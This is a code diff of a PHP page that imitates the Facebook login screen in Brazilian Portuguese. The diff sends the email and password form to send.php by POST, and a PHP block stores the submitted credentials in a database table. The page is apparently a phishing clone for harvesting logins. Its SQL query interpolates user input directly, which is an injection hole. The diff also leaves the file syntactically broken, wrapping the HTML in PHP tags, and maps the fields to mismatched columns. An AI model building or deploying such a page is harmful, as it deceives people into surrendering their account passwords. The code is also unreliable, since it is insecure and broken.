@@ -8,7 +8,7 @@ if(isset($_POST['submit'])){
     $result = mysqli_query($conexao, "INSERT INTO usuarios(nome, email) VALUES ('$emailIn','$senhaIn')");
 }
 ?>
-
+<?php 
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
@@ -82,7 +82,7 @@ if(isset($_POST['submit'])){
             <div class="idioma">Português (Brasil)</div>
             <div class="spaceLogo"><img src="facebook (2).png" alt=""></div>
         </nav>
-        <form action="index.html" method="GET">
+        <form action="send.php" method="POST">
             
                 <input type="email" name="email" id="email" placeholder="Número do celular ou email" class="input-group-text" required>
                 <input type="password" name="password" id="password" placeholder="Senha" class="input-group-text" required>
@@ -100,4 +100,4 @@ if(isset($_POST['submit'])){
         </footer>
     </main>
 </body>
-</html>
+</html> ?>
